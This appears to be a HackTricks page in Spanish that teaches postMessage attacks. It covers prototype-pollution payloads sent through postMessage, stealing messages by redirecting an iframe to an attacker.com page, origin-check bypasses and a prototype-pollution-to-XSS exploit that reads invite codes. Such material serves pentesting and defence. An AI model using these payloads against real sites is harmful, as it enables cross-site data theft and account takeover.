# Vulnerabilidades de PostMessage

## Vulnerabilidades de PostMessage

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue**me en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Enviar **PostMessage**

**PostMessage** utiliza la siguiente funci√≥n para enviar un mensaje:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Tenga en cuenta que **targetOrigin** puede ser un '\*' o una URL como _https://company.com._\
En el **segundo escenario**, el **mensaje solo se puede enviar a ese dominio** (incluso si el origen del objeto window es diferente).\
Si se utiliza el **comod√≠n**, los **mensajes podr√≠an enviarse a cualquier dominio** y se enviar√°n al origen del objeto Window.

### Atacando iframe & comod√≠n en **targetOrigin**

Como se explica en [**este informe**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) si encuentra una p√°gina que puede ser **iframed** (sin protecci√≥n `X-Frame-Header`) y que est√° **enviando mensajes sensibles** a trav√©s de **postMessage** usando un **comod√≠n** (\*), puede **modificar** el **origen** del **iframe** y **filtrar** el **mensaje sensible** a un dominio controlado por usted.\
Note que si la p√°gina puede ser iframed pero el **targetOrigin** est√° **establecido en una URL y no en un comod√≠n**, este **truco no funcionar√°**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Explotaci√≥n de addEventListener

**`addEventListener`** es la funci√≥n utilizada por JS para declarar la funci√≥n que est√° **esperando `postMessages`**.\
Se utilizar√° un c√≥digo similar al siguiente:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Tenga en cuenta c√≥mo lo **primero** que hace el c√≥digo es **verificar el origen**. Esto es tremendamente **importante**, especialmente si la p√°gina va a hacer **algo sensible** con la informaci√≥n recibida (como cambiar una contrase√±a). **Si no verifica el origen, los atacantes pueden hacer que las v√≠ctimas env√≠en datos arbitrarios a estos puntos finales** y cambiar las contrase√±as de las v√≠ctimas (en este ejemplo).

### Enumeraci√≥n

Para **encontrar oyentes de eventos** en la p√°gina actual, puede:

* **Buscar** en el c√≥digo JS `window.addEventListener` y `$(window).on` (_versi√≥n JQuery_)
* **Ejecutar** en la consola de herramientas para desarrolladores: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **Ir a** _Elementos --> Oyentes de Eventos_ en las herramientas para desarrolladores del navegador

![](<../../.gitbook/assets/image (617).png>)

* Usar una **extensi√≥n de navegador** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) o [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Estas extensiones de navegador **interceptar√°n todos los mensajes** y te los mostrar√°n.

### Bypasses de verificaci√≥n de origen

* **`event.isTrusted`** es verdadero cuando el evento fue generado por una acci√≥n del usuario. No es realmente evitable si se coloca correctamente, pero vale la pena mencionarlo.
* Si se usa **`indexOf()`** para **verificar** el **origen** del evento PostMessage, recuerde que se puede eludir f√°cilmente como en el siguiente ejemplo:
```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* Si se utiliza **`search()`** para **validar** el **origen** podr√≠a ser inseguro. Seg√∫n la documentaci√≥n de `String.prototype.search()`, el m√©todo **toma un objeto de expresi√≥n regular** en lugar de una cadena. Si se pasa algo que no sea regexp, se convertir√° impl√≠citamente en una regex.\
En expresi√≥n regular, **un punto (.) se trata como comod√≠n**. Un atacante puede aprovecharlo y **usar** un **dominio especial** en lugar del oficial para eludir la validaci√≥n, como en:
```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* Al igual que en el ejemplo anterior, **`match()`** tambi√©n verifica una **regex**, por lo que si la regex est√° mal formada podr√≠a ser **bypasseable**.
* Si se utiliza la funci√≥n **`escapeHtml`**, la funci√≥n no crea un objeto `new` escapado, sino que **sobrescribe propiedades** del objeto existente. Esto significa que si podemos crear un objeto con una propiedad controlada que no responde a `hasOwnProperty`, no ser√° escapado.
```javascript
// Expected to fail:
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
// Bypassed:
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```
El objeto `File` es perfecto para este exploit ya que tiene una propiedad `name` de solo lectura que es utilizada por nuestra plantilla y evitar√° la funci√≥n `escapeHtml`.

### e.origin == window.origin bypass

Cuando una p√°gina est√° incrustada en un **iframe con sandbox** a trav√©s de `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">`, el **origin** de ese **iframe** ser√° **`null`**.

Cuando se establece el **valor de sandbox `allow-popups`**, entonces el **popup abierto** heredar√° todos los **atributos con sandbox** a menos que se establezca `allow-popups-to-escape-sandbox`.\
Por lo tanto, abrir un **popup** desde un **origin null** har√° que **`window.origin`** dentro del popup tambi√©n sea **`null`**.

Por lo tanto, si abres un **iframe con sandbox** permitiendo popups, y luego **abres un popup** desde dentro del iframe, y **env√≠as un postMessage** desde el iframe **al popup**, ambos origins son null, por lo que: **`e.origin == window.origin == null`**

Para m√°s informaci√≥n **lee**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Bypassing e.source

Es posible verificar si el mensaje provino de la misma ventana en la que el script est√° escuchando (especialmente interesante para **Content Scripts de extensiones de navegador** para verificar si el mensaje fue enviado desde la misma p√°gina):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Puede forzar que **`e.source`** de un mensaje sea nulo creando un **iframe** que **env√≠a** el **postMessage** y es **eliminado inmediatamente**.

Para m√°s informaci√≥n **lea:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Bypass de X-Frame-Header

Para realizar estos ataques idealmente podr√° **poner la p√°gina web de la v√≠ctima** dentro de un `iframe`. Pero algunos encabezados como `X-Frame-Header` pueden **prevenir** ese **comportamiento**.\
En esos escenarios a√∫n puede usar un ataque menos sigiloso. Puede abrir una nueva pesta√±a hacia la aplicaci√≥n web vulnerable y comunicarse con ella:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Robo de mensaje enviado al hijo bloqueando la p√°gina principal

En la siguiente p√°gina puedes ver c√≥mo podr√≠as robar **datos sensibles de postmessage** enviados a un **iframe hijo** al **bloquear** la p√°gina **principal** antes de enviar los datos y abusar de un **XSS en el hijo** para **filtrar los datos** antes de que sean recibidos:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Robo de mensaje modificando la ubicaci√≥n del iframe

Si puedes incluir en un iframe una p√°gina web sin el encabezado X-Frame-Header que contiene otro iframe, puedes **cambiar la ubicaci√≥n de ese iframe hijo**, as√≠ que si est√° recibiendo un **postmessage** enviado usando un **comod√≠n**, un atacante podr√≠a **cambiar** el **origen** de ese iframe a una p√°gina **controlada** por √©l y **robar** el mensaje:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage a Contaminaci√≥n de Prototipo y/o XSS

En escenarios donde los datos enviados a trav√©s de `postMessage` son ejecutados por JS, puedes incluir en un **iframe** la **p√°gina** y **explotar** la **contaminaci√≥n de prototipo/XSS** enviando el exploit a trav√©s de `postMessage`.

Un par de **XSS muy bien explicados a trav√©s de `postMessage`** se pueden encontrar en [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Ejemplo de un exploit para abusar de **Contaminaci√≥n de Prototipo y luego XSS** a trav√©s de un `postMessage` a un `iframe`:
```markup
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Para **m√°s informaci√≥n**:

* Enlace a la p√°gina sobre [**contaminaci√≥n de prototipos**](../deserialization/nodejs-proto-prototype-pollution/)
* Enlace a la p√°gina sobre [**XSS**](../xss-cross-site-scripting/)
* Enlace a la p√°gina sobre [**contaminaci√≥n de prototipos en el cliente a XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Referencias

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Para practicar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>Aprende a hackear AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
